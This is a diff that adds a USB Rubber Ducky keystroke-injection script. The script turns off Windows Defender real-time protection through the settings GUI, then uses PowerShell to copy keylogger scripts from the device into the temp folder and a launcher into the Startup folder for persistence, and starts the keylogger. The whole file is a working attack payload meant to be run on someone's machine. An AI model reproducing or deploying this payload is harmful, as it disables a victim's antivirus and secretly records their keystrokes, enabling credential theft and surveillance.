@@ -1,0 +1,60 @@
+REM Author : Charming Bishop
+
+REM Pause for usb to recognize and be ready
+DELAY 2000
+
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 750
+STRING virus and threat protection
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Navigate to Manage Settings
+GUI
+DELAY 700
+GUI
+DELAY 1500
+TAB
+DELAY 600
+TAB
+DELAY 600
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 500
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM Powershell Keylogger for the USB RubberDucky
+
+REM STAGE1
+REM open runbox
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM STAGE 3
+REM move files to appropiate directories
+REM change 'L' to the name of your ducky
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'CIRCUITPY'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\l.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
+ENTER
+DELAY 200
+
+REM STAGE 4 
+REM run keylogger
+STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\c.cmd;exit
+
+REM STAGE 5
+REM deploy
+ENTER
